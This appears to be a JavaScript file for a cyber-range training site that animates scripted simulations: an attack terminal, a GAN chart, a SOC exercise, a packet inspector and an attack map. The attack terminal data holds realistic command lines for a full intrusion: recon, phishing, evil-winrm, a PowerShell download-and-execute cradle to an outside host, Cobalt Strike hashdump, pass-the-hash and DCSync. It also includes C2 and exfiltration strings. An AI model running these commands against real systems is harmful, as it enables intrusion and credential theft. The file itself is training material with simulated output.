// ============================================
// CyberRange AI — Simulation Controllers
// ============================================

(function () {
    'use strict';

    // =================== SHARED ===================
    const SIM = {};
    let activeIntervals = [];

    function openSim(id) {
        document.getElementById(id).classList.add('open');
        document.body.style.overflow = 'hidden';
    }
    function closeSim(id) {
        document.getElementById(id).classList.remove('open');
        document.body.style.overflow = '';
        activeIntervals.forEach(clearInterval);
        activeIntervals = [];
    }
    function now() { return new Date().toTimeString().slice(0, 8); }
    function rnd(a, b) { return Math.floor(Math.random() * (b - a + 1)) + a; }
    function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

    // Close buttons
    document.addEventListener('click', e => {
        const btn = e.target.closest('.sim-close-btn');
        if (btn) closeSim(btn.dataset.close);
    });

    // =================== 1. ATTACK TERMINAL ===================
    const ATK_PHASES = [
        {
            name: 'Reconnaissance', commands: [
                {
                    cmd: 'nmap -sV -sC -O 10.10.1.0/24', output: [
                        'Starting Nmap 7.94 ( https://nmap.org )',
                        'Scanning 254 hosts...',
                        'Discovered host: 10.10.1.5 (DC-PRIMARY) — Windows Server 2022',
                        'Discovered host: 10.10.1.10 (FILE-SERVER-01) — Windows Server 2019',
                        'Discovered host: 10.10.1.15 (LINUX-WEB-01) — Ubuntu 22.04',
                        'PORT    STATE  SERVICE       VERSION',
                        '22/tcp  open   ssh           OpenSSH 8.9',
                        '80/tcp  open   http          Apache 2.4.54',
                        '88/tcp  open   kerberos-sec  Microsoft Kerberos',
                        '135/tcp open   msrpc         Microsoft Windows RPC',
                        '389/tcp open   ldap          Microsoft AD LDAP',
                        '445/tcp open   microsoft-ds  Windows Server 2022 SMB',
                        '3389/tcp open  ms-wbt-server Microsoft Terminal Services',
                        '[+] Scan complete — 8 hosts up, 47 open ports found',
                    ]
                },
                {
                    cmd: 'enum4linux -a 10.10.1.5', output: [
                        '[*] Target: 10.10.1.5',
                        '[+] Domain: CYBERRANGE',
                        '[+] Domain SID: S-1-5-21-3842939050-3880317879-2865463114',
                        '[+] Users found: Administrator, svc_backup, j.nakamura, s.chen, m.wright',
                        '[+] Groups: Domain Admins, IT Support, Developers, Executives',
                        '[+] Password policy: Min length=8, Lockout=5/30min, Complexity=On',
                        '[+] Shares: ADMIN$, C$, IPC$, NETLOGON, SYSVOL, FileShare$',
                    ]
                },
            ]
        },
        {
            name: 'Initial Access', commands: [
                {
                    cmd: 'python3 phishing_framework.py --target s.chen@cyberrange.lab --template office365', output: [
                        '[*] Generating credential harvesting page...',
                        '[*] Cloning Office365 login portal...',
                        '[*] Registering domain: auth-office365-verify.com',
                        '[*] Sending phishing email to s.chen@cyberrange.lab',
                        '[+] Email delivered successfully — Message-ID: <8a7f2c@mail.cyberrange.lab>',
                        '[*] Waiting for victim interaction...',
                        '...',
                        '[!] CREDENTIAL CAPTURED: s.chen / S@rah2024!Cyber',
                        '[+] Initial access obtained — valid domain credentials',
                    ]
                },
            ]
        },
        {
            name: 'Execution', commands: [
                {
                    cmd: 'evil-winrm -i 10.10.1.10 -u s.chen -p "S@rah2024!Cyber"', output: [
                        '[*] Connecting to 10.10.1.10 (FILE-SERVER-01)...',
                        '[+] WinRM session established!',
                        '*Evil-WinRM* PS C:\\Users\\s.chen> whoami',
                        'cyberrange\\s.chen',
                        '*Evil-WinRM* PS C:\\Users\\s.chen> hostname',
                        'FILE-SERVER-01',
                    ]
                },
                {
                    cmd: 'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.5.99:8080/payload.ps1\')"', output: [
                        '[*] Downloading Cobalt Strike stager...',
                        '[*] Executing in-memory payload...',
                        '[+] Beacon initialized — PID 4728',
                        '[+] Callback received from 10.10.1.10:445',
                        '[+] Sleep: 5s | Jitter: 37%',
                    ]
                },
            ]
        },
        {
            name: 'Privilege Escalation', commands: [
                {
                    cmd: 'beacon> getsystem', output: [
                        '[*] Attempting privilege escalation...',
                        '[*] Trying Named Pipe Impersonation (In Memory/Admin)...',
                        '[+] SUCCESS — Impersonated NT AUTHORITY\\SYSTEM',
                    ]
                },
                {
                    cmd: 'beacon> hashdump', output: [
                        '[*] Dumping local SAM hashes...',
                        'Administrator:500:aad3b435b51404ee:e02bc503339d51f71d913176d3e0ce22:::',
                        's.chen:1104:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::',
                        'svc_backup:1108:aad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::',
                        '[+] 3 hashes extracted',
                    ]
                },
            ]
        },
        {
            name: 'Lateral Movement', commands: [
                {
                    cmd: 'beacon> jump psexec64 10.10.1.5 CYBERRANGE\\svc_backup 2b576acbe6bcfda7294d6bd18041b8fe', output: [
                        '[*] Establishing connection to DC-PRIMARY (10.10.1.5)...',
                        '[*] Using pass-the-hash with svc_backup account...',
                        '[*] Deploying beacon via PsExec...',
                        '[+] New beacon — DC-PRIMARY | NT AUTHORITY\\SYSTEM | PID 6144',
                        '[!] DOMAIN CONTROLLER COMPROMISED',
                    ]
                },
            ]
        },
        {
            name: 'Exfiltration', commands: [
                {
                    cmd: 'beacon> dcsync cyberrange.lab CYBERRANGE\\Administrator', output: [
                        '[*] Performing DCSync attack...',
                        '[*] Replicating directory changes from DC-PRIMARY...',
                        '[+] Account: CYBERRANGE\\Administrator',
                        '[+] NTLM Hash: e02bc503339d51f71d913176d3e0ce22',
                        '[+] Kerberos Keys extracted — AES256, AES128, DES',
                        '[+] DCSync complete — Full domain compromise achieved',
                    ]
                },
                {
                    cmd: 'beacon> download C:\\Confidential\\*.xlsx', output: [
                        '[*] Downloading files from FILE-SERVER-01...',
                        '[+] Q4_Financial_Report.xlsx — 2.4 MB',
                        '[+] Employee_Records_2024.xlsx — 1.8 MB',
                        '[+] Strategic_Plan_2025.xlsx — 890 KB',
                        '[+] Exfiltration complete — 5.1 MB transferred via HTTPS C2',
                    ]
                },
            ]
        },
    ];

    let atkPaused = false, atkRunning = false;

    function startAttackTerminal() {
        const term = document.getElementById('atkTerminalOutput');
        const kcEl = document.getElementById('atkKillChain');
        const techList = document.getElementById('atkTechList');
        term.innerHTML = '';
        techList.innerHTML = '';
        atkPaused = false; atkRunning = true;
        // Build kill chain sidebar
        kcEl.innerHTML = ATK_PHASES.map((p, i) => `<div class="sim-kc-item pending" id="atkKc${i}"><i class="fas fa-circle" style="font-size:.5rem"></i> ${p.name}</div>`).join('');
        // Print banner
        term.innerHTML = '<span class="t-info">╔══════════════════════════════════════════════════════╗\n║  CyberRange AI — Attack Simulation Engine v3.2       ║\n║  Target: DC-PRIMARY (10.10.1.5)                      ║\n║  Campaign: APT29 Enterprise Intrusion                ║\n╚══════════════════════════════════════════════════════╝</span>\n\n';
        runPhases(0);
    }

    async function runPhases(phaseIdx) {
        if (phaseIdx >= ATK_PHASES.length || !atkRunning) { addTermLine('\n<span class="t-success">[✓] ATTACK SIMULATION COMPLETE — All phases executed successfully</span>\n'); return; }
        const phase = ATK_PHASES[phaseIdx];
        const term = document.getElementById('atkTerminalOutput');
        const label = document.getElementById('atkPhaseLabel');
        // Update kill chain
        if (phaseIdx > 0) document.getElementById('atkKc' + (phaseIdx - 1)).className = 'sim-kc-item done';
        document.getElementById('atkKc' + phaseIdx).className = 'sim-kc-item active';
        label.textContent = 'Phase: ' + phase.name;
        addTermLine(`\n<span class="t-warning">═══ PHASE: ${phase.name.toUpperCase()} ═══</span>\n`);
        for (const cmd of phase.commands) {
            if (!atkRunning) return;
            await typeCommand(cmd.cmd);
            for (const line of cmd.output) {
                if (!atkRunning) return;
                while (atkPaused) await sleep(200);
                await sleep(60 + Math.random() * 80);
                const cls = line.startsWith('[+]') ? 't-success' : line.startsWith('[!]') ? 't-error' : line.startsWith('[*]') ? 't-info' : 't-output';
                addTermLine(`<span class="${cls}">${escHtml(line)}</span>`);
            }
            // Add technique tag
            const techName = phase.name;
            const tag = document.createElement('span');
            tag.className = 'sim-tech-tag';
            tag.textContent = techName;
            document.getElementById('atkTechList').appendChild(tag);
            addTermLine('');
        }
        document.getElementById('atkKc' + phaseIdx).className = 'sim-kc-item done';
        await sleep(500);
        runPhases(phaseIdx + 1);
    }

    async function typeCommand(cmd) {
        const term = document.getElementById('atkTerminalOutput');
        const line = document.createElement('div');
        line.innerHTML = '<span class="t-prompt">root@kali:~# </span><span class="t-cmd"></span><span class="t-cursor"></span>';
        term.appendChild(line);
        const cmdSpan = line.querySelector('.t-cmd');
        const cursor = line.querySelector('.t-cursor');
        for (let i = 0; i < cmd.length; i++) {
            while (atkPaused) await sleep(200);
            if (!atkRunning) return;
            cmdSpan.textContent += cmd[i];
            term.scrollTop = term.scrollHeight;
            await sleep(25 + Math.random() * 35);
        }
        cursor.remove();
        await sleep(300);
    }

    function addTermLine(html) {
        const term = document.getElementById('atkTerminalOutput');
        const div = document.createElement('div');
        div.innerHTML = html;
        term.appendChild(div);
        term.scrollTop = term.scrollHeight;
    }

    function escHtml(s) { return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

    // Pause/Resume
    document.getElementById('atkPauseBtn')?.addEventListener('click', function () {
        atkPaused = !atkPaused;
        this.innerHTML = atkPaused ? '<i class="fas fa-play"></i> Resume' : '<i class="fas fa-pause"></i> Pause';
    });

    // =================== 2. GAN TRAINING VISUALIZER ===================
    let ganChart = null, ganDistChart = null;

    function startGanTraining() {
        let epoch = 0;
        const maxEpoch = 1000;
        const genLossData = [], discLossData = [], epochLabels = [];
        // Init charts
        const lossCtx = document.getElementById('ganLiveLossChart');
        const distCtx = document.getElementById('ganDistChart');
        if (ganChart) ganChart.destroy();
        if (ganDistChart) ganDistChart.destroy();
        ganChart = new Chart(lossCtx, {
            type: 'line', data: {
                labels: epochLabels, datasets: [
                    { label: 'Generator Loss', data: genLossData, borderColor: '#00e5ff', tension: .3, pointRadius: 0, borderWidth: 2 },
                    { label: 'Discriminator Loss', data: [], borderColor: '#ff1744', tension: .3, pointRadius: 0, borderWidth: 2 }
                ]
            }, options: {
                responsive: true, animation: false, plugins: { legend: { labels: { color: '#8892a8', font: { family: 'Inter' } } } },
                scales: { x: { display: false }, y: { grid: { color: 'rgba(255,255,255,.04)' }, ticks: { color: '#505a70' } } }
            }
        });

        const realDist = [5, 12, 25, 38, 52, 65, 48, 30, 18, 8];
        const genDist = [2, 5, 10, 15, 20, 25, 20, 15, 10, 5];
        ganDistChart = new Chart(distCtx, {
            type: 'bar', data: {
                labels: ['DNS', 'SSH', 'HTTP', 'HTTPS', 'SMB', 'RDP', 'SMTP', 'FTP', 'ICMP', 'Other'],
                datasets: [
                    { label: 'Real Traffic', data: [...realDist], backgroundColor: 'rgba(0,229,255,.4)', borderColor: '#00e5ff', borderWidth: 1, borderRadius: 4 },
                    { label: 'Generated Traffic', data: [...genDist], backgroundColor: 'rgba(124,77,255,.4)', borderColor: '#7c4dff', borderWidth: 1, borderRadius: 4 }
                ]
            }, options: {
                responsive: true, animation: false, plugins: { legend: { labels: { color: '#8892a8', font: { family: 'Inter' } } } },
                scales: { x: { ticks: { color: '#505a70' } }, y: { grid: { color: 'rgba(255,255,255,.04)' }, ticks: { color: '#505a70' } } }
            }
        });

        const iv = setInterval(() => {
            epoch += rnd(3, 8);
            if (epoch > maxEpoch) epoch = maxEpoch;
            const genLoss = Math.max(0.05, 3.5 * Math.exp(-epoch * 0.004) + (Math.random() - 0.5) * 0.2);
            const discLoss = 0.5 + 0.3 * Math.sin(epoch * 0.01) + (Math.random() - 0.5) * 0.1;
            const fidelity = Math.min(99.2, 50 + epoch * 0.05 + Math.random() * 2);
            document.getElementById('ganEpoch').textContent = epoch + ' / ' + maxEpoch;
            document.getElementById('ganProgressBar').style.width = (epoch / maxEpoch * 100) + '%';
            document.getElementById('ganGenLoss').textContent = genLoss.toFixed(4);
            document.getElementById('ganDiscLoss').textContent = discLoss.toFixed(4);
            document.getElementById('ganFidelity').textContent = fidelity.toFixed(1) + '%';
            document.getElementById('ganGPU').textContent = rnd(6, 11) + '.' + rnd(1, 9) + ' GB / 16 GB';
            epochLabels.push(epoch);
            ganChart.data.datasets[0].data.push(genLoss);
            ganChart.data.datasets[1].data.push(discLoss);
            if (epochLabels.length > 60) { epochLabels.shift(); ganChart.data.datasets[0].data.shift(); ganChart.data.datasets[1].data.shift(); }
            ganChart.update();
            // Converge distributions
            const progress = epoch / maxEpoch;
            for (let i = 0; i < realDist.length; i++) {
                ganDistChart.data.datasets[1].data[i] = genDist[i] + (realDist[i] - genDist[i]) * progress + (Math.random() - 0.5) * 3;
            }
            ganDistChart.update();
            if (epoch >= maxEpoch) { clearInterval(iv); document.getElementById('ganStatusPill').innerHTML = '<i class="fas fa-check"></i> Complete'; document.getElementById('ganStatusPill').className = 'status-pill active'; }
        }, 200);
        activeIntervals.push(iv);
    }

    // =================== 3. TRAINING EXERCISE ===================
    const EX_OBJECTIVES = [
        { text: 'Identify the compromised host', points: 75, action: 'scan' },
        { text: 'Block the C2 IP address', points: 100, action: 'block' },
        { text: 'Isolate the infected machine', points: 100, action: 'isolate' },
        { text: 'Capture memory dump for forensics', points: 75, action: 'capture' },
        { text: 'Disable the compromised account', points: 75, action: 'disable' },
        { text: 'Escalate to incident response team', points: 75, action: 'escalate' },
    ];

    const EX_ALERTS_POOL = [
        { title: 'Cobalt Strike Beacon Detected', desc: 'Callback to 185.243.115.47:443 from FILE-SERVER-01 (10.10.1.10)' },
        { title: 'Suspicious PowerShell Execution', desc: 'Encoded command detected — PID 4728 on FILE-SERVER-01' },
        { title: 'LSASS Memory Access', desc: 'Process procdump.exe accessed lsass.exe on DC-PRIMARY' },
        { title: 'Kerberoasting Attempt', desc: 'SPN request for svc_backup from s.chen workstation' },
        { title: 'Lateral Movement via SMB', desc: 'PsExec.exe connection from 10.10.1.10 → 10.10.1.5 (DC-PRIMARY)' },
        { title: 'Data Exfiltration Detected', desc: '5.1 MB transferred to external IP via HTTPS tunnel' },
        { title: 'DNS Tunneling Pattern', desc: '847 TXT queries to suspicious domain in 5 minutes' },
        { title: 'New Scheduled Task Created', desc: 'Task "WindowsUpdate" created on DC-PRIMARY — runs cmd.exe' },
    ];

    let exScore = 0, exTimer = 1800, exTimerIv;

    function startExercise() {
        exScore = 0; exTimer = 1800;
        document.getElementById('exScore').textContent = '0';
        document.getElementById('exTimer').textContent = '30:00';
        const objEl = document.getElementById('exObjectives');
        const eventEl = document.getElementById('exEventLog');
        const alertsEl = document.getElementById('exAlertsFeed');
        eventEl.innerHTML = ''; alertsEl.innerHTML = '';
        objEl.innerHTML = EX_OBJECTIVES.map((o, i) => `<div class="sim-obj" id="exObj${i}"><span class="sim-obj-check"><i class="fas fa-circle" style="font-size:.5rem"></i></span><span>${o.text}</span><span style="margin-left:auto;font-size:.75rem;color:var(--text-muted)">+${o.points} pts</span></div>`).join('');
        addEvent('Exercise started — APT Response Scenario');
        addEvent('Monitoring feeds activated');
        // Timer
        exTimerIv = setInterval(() => {
            exTimer--;
            const m = Math.floor(exTimer / 60).toString().padStart(2, '0');
            const s = (exTimer % 60).toString().padStart(2, '0');
            document.getElementById('exTimer').textContent = m + ':' + s;
            if (exTimer <= 0) clearInterval(exTimerIv);
        }, 1000);
        activeIntervals.push(exTimerIv);
        // Fire alerts
        let alertIdx = 0;
        const alertIv = setInterval(() => {
            if (alertIdx >= EX_ALERTS_POOL.length) { clearInterval(alertIv); return; }
            const a = EX_ALERTS_POOL[alertIdx++];
            const card = document.createElement('div');
            card.className = 'sim-alert-card';
            card.innerHTML = `<div class="sim-alert-title"><i class="fas fa-triangle-exclamation"></i> ${a.title}</div><div class="sim-alert-desc">${a.desc}</div>`;
            alertsEl.prepend(card);
            addEvent(`⚠ ${a.title}`);
        }, 4000);
        activeIntervals.push(alertIv);
        // Action buttons
        document.querySelectorAll('.sim-action-btn').forEach(btn => {
            btn.classList.remove('used');
            btn.onclick = () => {
                const action = btn.dataset.action;
                btn.classList.add('used');
                EX_OBJECTIVES.forEach((o, i) => {
                    if (o.action === action && !document.getElementById('exObj' + i).classList.contains('completed')) {
                        document.getElementById('exObj' + i).classList.add('completed');
                        document.getElementById('exObj' + i).querySelector('.sim-obj-check').innerHTML = '<i class="fas fa-check-circle"></i>';
                        exScore += o.points;
                        document.getElementById('exScore').textContent = exScore;
                        addEvent(`✓ Action completed: ${o.text} (+${o.points} pts)`);
                    }
                });
                addEvent(`Action: ${btn.textContent.trim()} executed`);
            };
        });
    }

    function addEvent(msg) {
        const el = document.getElementById('exEventLog');
        if (!el) return;
        const div = document.createElement('div');
        div.className = 'sim-event';
        div.innerHTML = `<span class="ev-time">${now().slice(0, 5)}</span><span class="ev-msg">${msg}</span>`;
        el.prepend(div);
    }

    // =================== 4. PACKET INSPECTOR ===================
    const PKT_INFOS = {
        tcp: ['SYN', 'SYN-ACK', 'ACK', 'FIN', 'RST', 'PSH-ACK', 'Window Update'],
        udp: ['Standard query', 'Standard response', 'Datagram'],
        http: ['GET /index.html', 'POST /api/login', 'GET /static/app.js', 'PUT /api/data', 'DELETE /api/session', 'GET /favicon.ico'],
        dns: ['Standard query A cyberrange.lab', 'Standard query AAAA mail.local', 'Standard query TXT evil.xyz', 'Standard response A 10.10.1.5'],
    };
    const SUSPICIOUS_INFO = [
        'GET /c2/beacon?id=4728&sleep=5',
        'POST /exfil (5.1MB encrypted payload)',
        'DNS TXT dGhlc2VjcmV0.evil-update.darknet.xyz',
        'Encrypted C2 callback — port 443 non-standard TLS',
    ];
    let pktCounter = 0;

    function startPacketInspector() {
        pktCounter = 0;
        document.getElementById('pktTableBody').innerHTML = '';
        document.getElementById('pktHeaders').innerHTML = '<div class="sim-pkt-section-title">Select a packet to inspect</div>';
        document.getElementById('pktHex').innerHTML = '<div class="sim-pkt-section-title">Hex Dump</div>';
        const iv = setInterval(() => {
            addPacket();
        }, 300);
        activeIntervals.push(iv);
        // Initial batch
        for (let i = 0; i < 15; i++) addPacket();
    }

    function addPacket() {
        const tbody = document.getElementById('pktTableBody');
        if (!tbody) return;
        pktCounter++;
        const protos = ['TCP', 'UDP', 'HTTP', 'DNS', 'TCP', 'TCP', 'HTTP', 'TCP'];
        const proto = pick(protos);
        const isSusp = Math.random() < 0.08;
        const srcIPs = ['10.10.1.10', '10.10.2.15', '10.10.1.5', '172.16.0.3', '10.10.3.22', '185.243.115.47', '91.234.99.102'];
        const dstIPs = ['10.10.1.5', '10.10.1.10', '172.16.0.1', '8.8.8.8', '10.10.2.15', '185.243.115.47'];
        const src = isSusp ? '10.10.1.10' : pick(srcIPs);
        const dst = isSusp ? '185.243.115.47' : pick(dstIPs);
        const len = rnd(54, 1514);
        const info = isSusp ? pick(SUSPICIOUS_INFO) : pick(PKT_INFOS[proto.toLowerCase()] || PKT_INFOS.tcp);
        const tr = document.createElement('tr');
        if (isSusp) tr.className = 'suspicious';
        tr.innerHTML = `<td>${pktCounter}</td><td>${now()}</td><td style="font-family:var(--mono);font-size:.8rem">${src}</td><td style="font-family:var(--mono);font-size:.8rem">${dst}</td><td>${proto}</td><td>${len}</td><td style="max-width:250px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${info}</td><td>${isSusp ? '<span style="color:var(--red)">⚠</span>' : ''}</td>`;
        tr.onclick = () => selectPacket(tr, { num: pktCounter, src, dst, proto, len, info, isSusp });
        tbody.appendChild(tr);
        // Auto-scroll
        const wrap = tbody.closest('.sim-pkt-list-wrap');
        if (wrap) wrap.scrollTop = wrap.scrollHeight;
        // Limit rows
        while (tbody.children.length > 200) tbody.removeChild(tbody.firstChild);
    }

    function selectPacket(tr, pkt) {
        document.querySelectorAll('.sim-pkt-table tbody tr.selected').forEach(r => r.classList.remove('selected'));
        tr.classList.add('selected');
        const srcPort = rnd(1024, 65535), dstPort = pick([80, 443, 53, 445, 22, 3389, 8443]);
        const seq = rnd(100000, 999999), ack = seq + pkt.len;
        document.getElementById('pktHeaders').innerHTML = `<div class="sim-pkt-section-title">Packet Headers — #${pkt.num}</div>
<div class="pkt-header-tree">▸ <span class="tree-key">Ethernet II</span>
  Src: <span class="tree-val">00:1a:4b:${rnd(10, 99)}:${rnd(10, 99)}:${rnd(10, 99)}</span>
  Dst: <span class="tree-val">00:50:56:${rnd(10, 99)}:${rnd(10, 99)}:${rnd(10, 99)}</span>
  Type: <span class="tree-val">IPv4 (0x0800)</span>

▸ <span class="tree-key">Internet Protocol v4</span>
  Src: <span class="tree-val">${pkt.src}</span>
  Dst: <span class="tree-val">${pkt.dst}</span>
  TTL: <span class="tree-val">${rnd(50, 128)}</span>
  Protocol: <span class="tree-val">${pkt.proto} (${pkt.proto === 'TCP' ? 6 : pkt.proto === 'UDP' ? 17 : 6})</span>

▸ <span class="tree-key">${pkt.proto}</span>
  Src Port: <span class="tree-val">${srcPort}</span>
  Dst Port: <span class="tree-val">${dstPort}</span>
  Seq: <span class="tree-val">${seq}</span>
  Ack: <span class="tree-val">${ack}</span>
  Flags: <span class="tree-val">0x018 (PSH, ACK)</span>
  Window: <span class="tree-val">${rnd(16000, 65535)}</span>
  Length: <span class="tree-val">${pkt.len}</span>
${pkt.isSusp ? '\n<span style="color:var(--red);font-weight:700">⚠ SUSPICIOUS: ' + pkt.info + '</span>' : ''}
</div>`;
        // Hex dump
        let hex = '', ascii = '', hexLines = '';
        for (let i = 0; i < Math.min(pkt.len, 256); i++) {
            const b = rnd(0, 255);
            hex += (b < 16 ? '0' : '') + b.toString(16) + ' ';
            ascii += (b >= 32 && b <= 126) ? String.fromCharCode(b) : '.';
            if ((i + 1) % 16 === 0) {
                const offset = (i - 15).toString(16).padStart(8, '0');
                hexLines += `${offset}  ${hex} |${ascii}|\n`;
                hex = ''; ascii = '';
            }
        }
        if (hex) { const offset = (Math.floor(pkt.len / 16) * 16).toString(16).padStart(8, '0'); hexLines += `${offset}  ${hex.padEnd(48)} |${ascii}|\n`; }
        document.getElementById('pktHex').innerHTML = `<div class="sim-pkt-section-title">Hex Dump (${Math.min(pkt.len, 256)} of ${pkt.len} bytes)</div><pre style="margin:0;white-space:pre">${hexLines}</pre>`;
    }

    // =================== 5. LIVE ATTACK MAP ===================
    const MAP_NODES = [
        { id: 'internet', x: 0.5, y: 0.05, label: '🌐 Internet', status: 'healthy', r: 28 },
        { id: 'firewall', x: 0.5, y: 0.17, label: '🛡️ Firewall', status: 'healthy', r: 24 },
        { id: 'dmz-switch', x: 0.2, y: 0.3, label: 'DMZ Switch', status: 'healthy', r: 20 },
        { id: 'core-switch', x: 0.5, y: 0.3, label: 'Core Switch', status: 'healthy', r: 20 },
        { id: 'ids', x: 0.8, y: 0.3, label: '👁️ IDS/IPS', status: 'healthy', r: 20 },
        { id: 'web-srv', x: 0.12, y: 0.48, label: '🌐 Web Server', status: 'healthy', r: 22 },
        { id: 'mail-srv', x: 0.3, y: 0.48, label: '📧 Mail Server', status: 'healthy', r: 22 },
        { id: 'file-srv', x: 0.5, y: 0.48, label: '📁 File Server', status: 'healthy', r: 22 },
        { id: 'dc', x: 0.7, y: 0.48, label: '🏛️ DC-PRIMARY', status: 'healthy', r: 22 },
        { id: 'siem', x: 0.88, y: 0.48, label: '📊 SIEM', status: 'healthy', r: 22 },
        { id: 'user1', x: 0.2, y: 0.7, label: '💻 Workstation 1', status: 'healthy', r: 18 },
        { id: 'user2', x: 0.4, y: 0.7, label: '💻 Workstation 2', status: 'healthy', r: 18 },
        { id: 'user3', x: 0.6, y: 0.7, label: '💻 Workstation 3', status: 'healthy', r: 18 },
        { id: 'kali', x: 0.5, y: 0.9, label: '☠️ Attacker', status: 'compromised', r: 24 },
    ];
    const MAP_EDGES = [[0, 1], [1, 2], [1, 3], [1, 4], [2, 5], [2, 6], [3, 7], [3, 8], [4, 9], [3, 10], [3, 11], [3, 12]];
    const MAP_ATTACK_STEPS = [
        { phase: 'Reconnaissance', from: 'kali', to: 'firewall', compromise: null, msg: 'Port scanning target network...' },
        { phase: 'Reconnaissance', from: 'kali', to: 'core-switch', compromise: null, msg: 'Enumerating AD via LDAP...' },
        { phase: 'Initial Access', from: 'kali', to: 'mail-srv', compromise: 'mail-srv', msg: 'Phishing email delivered to s.chen' },
        { phase: 'Execution', from: 'mail-srv', to: 'file-srv', compromise: 'file-srv', msg: 'Cobalt Strike beacon deployed on File Server' },
        { phase: 'Privilege Escalation', from: 'file-srv', to: 'file-srv', compromise: null, msg: 'Privilege escalation — SYSTEM obtained' },
        { phase: 'Lateral Movement', from: 'file-srv', to: 'dc', compromise: 'dc', msg: 'PsExec to Domain Controller — COMPROMISED' },
        { phase: 'Exfiltration', from: 'dc', to: 'kali', compromise: null, msg: 'DCSync — all domain hashes extracted' },
        { phase: 'Exfiltration', from: 'file-srv', to: 'kali', compromise: null, msg: 'Data exfiltration — 5.1 MB via HTTPS C2' },
    ];

    let mapAnimFrame, mapStepIdx = 0, attackArrows = [];

    function startAttackMap() {
        const canvas = document.getElementById('attackMapCanvas');
        const sidebar = canvas.parentElement;
        canvas.width = sidebar.offsetWidth - 300;
        canvas.height = sidebar.offsetHeight;
        mapStepIdx = 0;
        attackArrows = [];
        MAP_NODES.forEach(n => { n.status = n.id === 'kali' ? 'compromised' : 'healthy'; });
        renderMapSidebar();
        drawMap();
        // Step through attacks
        const stepIv = setInterval(() => {
            if (mapStepIdx >= MAP_ATTACK_STEPS.length) { clearInterval(stepIv); return; }
            const step = MAP_ATTACK_STEPS[mapStepIdx++];
            const fromNode = MAP_NODES.find(n => n.id === step.from);
            const toNode = MAP_NODES.find(n => n.id === step.to);
            if (step.compromise) {
                const target = MAP_NODES.find(n => n.id === step.compromise);
                if (target) target.status = 'compromised';
            } else if (toNode && toNode.status === 'healthy') {
                toNode.status = 'targeted';
            }
            attackArrows.push({ from: fromNode, to: toNode, time: Date.now() });
            // Update sidebar
            renderMapSidebar(step);
        }, 3000);
        activeIntervals.push(stepIv);
    }

    function renderMapSidebar(lastStep) {
        const phasesEl = document.getElementById('mapPhases');
        const nodesEl = document.getElementById('mapCompromised');
        const actEl = document.getElementById('mapActivity');
        const phases = ['Reconnaissance', 'Initial Access', 'Execution', 'Privilege Escalation', 'Lateral Movement', 'Exfiltration'];
        const currentPhase = lastStep ? lastStep.phase : '';
        const donePhases = MAP_ATTACK_STEPS.slice(0, mapStepIdx).map(s => s.phase);
        phasesEl.innerHTML = phases.map(p => {
            const cls = donePhases.includes(p) ? (p === currentPhase ? 'active' : 'done') : 'pending';
            return `<div class="sim-map-phase ${cls}"><i class="fas fa-circle" style="font-size:.4rem"></i> ${p}</div>`;
        }).join('');
        nodesEl.innerHTML = MAP_NODES.filter(n => n.status === 'compromised' && n.id !== 'kali')
            .map(n => `<div class="sim-map-node"><span>${n.label}</span><span style="font-size:.7rem">${now()}</span></div>`).join('') || '<div style="color:var(--text-muted);font-size:.82rem">None yet</div>';
        if (lastStep) {
            const div = document.createElement('div');
            div.className = 'sim-map-activity-item';
            div.textContent = `[${now().slice(0, 5)}] ${lastStep.msg}`;
            actEl.prepend(div);
        }
    }

    function drawMap() {
        const canvas = document.getElementById('attackMapCanvas');
        if (!canvas || !canvas.getContext) return;
        const ctx = canvas.getContext('2d');
        const W = canvas.width, H = canvas.height;
        const statusColors = { healthy: '#00e676', targeted: '#ffab00', compromised: '#ff1744' };

        function frame() {
            ctx.clearRect(0, 0, W, H);
            // Edges
            MAP_EDGES.forEach(([a, b]) => {
                const n1 = MAP_NODES[a], n2 = MAP_NODES[b];
                ctx.beginPath();
                ctx.moveTo(n1.x * W, n1.y * H);
                ctx.lineTo(n2.x * W, n2.y * H);
                ctx.strokeStyle = 'rgba(100,220,255,.12)';
                ctx.lineWidth = 1.5;
                ctx.stroke();
            });
            // Attack arrows with animation
            const now2 = Date.now();
            attackArrows.forEach(arrow => {
                const elapsed = now2 - arrow.time;
                const t = Math.min(1, elapsed / 1500);
                const fromX = arrow.from.x * W, fromY = arrow.from.y * H;
                const toX = arrow.to.x * W, toY = arrow.to.y * H;
                // Line
                ctx.beginPath();
                ctx.moveTo(fromX, fromY);
                ctx.lineTo(fromX + (toX - fromX) * t, fromY + (toY - fromY) * t);
                ctx.strokeStyle = 'rgba(255,23,68,.8)';
                ctx.lineWidth = 2.5;
                ctx.setLineDash([6, 4]);
                ctx.stroke();
                ctx.setLineDash([]);
                // Animated dot
                if (t < 1) {
                    const dotT = (elapsed % 800) / 800;
                    const dx = fromX + (toX - fromX) * dotT;
                    const dy = fromY + (toY - fromY) * dotT;
                    ctx.beginPath();
                    ctx.arc(dx, dy, 4, 0, Math.PI * 2);
                    ctx.fillStyle = '#ff1744';
                    ctx.fill();
                    ctx.beginPath();
                    ctx.arc(dx, dy, 8, 0, Math.PI * 2);
                    ctx.fillStyle = 'rgba(255,23,68,.3)';
                    ctx.fill();
                }
            });
            // Nodes
            MAP_NODES.forEach(n => {
                const x = n.x * W, y = n.y * H, col = statusColors[n.status];
                // Glow for compromised
                if (n.status === 'compromised') {
                    const glowR = n.r + 8 + Math.sin(Date.now() / 300) * 4;
                    ctx.beginPath();
                    ctx.arc(x, y, glowR, 0, Math.PI * 2);
                    ctx.fillStyle = 'rgba(255,23,68,.15)';
                    ctx.fill();
                }
                if (n.status === 'targeted') {
                    const glowR = n.r + 6 + Math.sin(Date.now() / 400) * 3;
                    ctx.beginPath();
                    ctx.arc(x, y, glowR, 0, Math.PI * 2);
                    ctx.fillStyle = 'rgba(255,171,0,.12)';
                    ctx.fill();
                }
                // Node circle
                ctx.beginPath();
                ctx.arc(x, y, n.r, 0, Math.PI * 2);
                ctx.fillStyle = 'rgba(12,18,40,.95)';
                ctx.fill();
                ctx.strokeStyle = col;
                ctx.lineWidth = 2.5;
                ctx.stroke();
                // Icon
                ctx.font = `${n.r * 0.8}px serif`;
